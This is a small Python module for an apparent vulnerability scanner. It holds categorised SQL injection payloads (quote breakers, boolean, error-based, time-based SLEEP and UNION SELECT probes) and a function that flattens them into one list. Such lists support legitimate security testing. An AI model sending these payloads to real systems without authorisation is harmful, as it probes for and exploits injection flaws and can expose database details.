# Categorized payloads for structured testing

PAYLOAD_CATEGORIES = {
    "basic": [
        "'",
        "\"",
        "'--",
        "\"--"
    ],

    "boolean": [
        "' AND '1'='1",
        "' AND '1'='2",
        "\" AND \"1\"=\"1",
        "\" AND \"1\"=\"2"
    ],

    "error_based": [
        "' AND extractvalue(1, concat(0x7e,version()))--",
        "' AND updatexml(1,concat(0x7e,database()),1)--"
    ],

    "time_based": [
        "' AND SLEEP(3)--",
        "\" AND SLEEP(3)--"
    ],

    "union_test": [
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--",
        "' UNION SELECT NULL,NULL,NULL--"
    ]
}


# Flatten list (for scanner)
def get_all_payloads():
    payloads = []
    for category in PAYLOAD_CATEGORIES.values():
        payloads.extend(category)
    return payloads
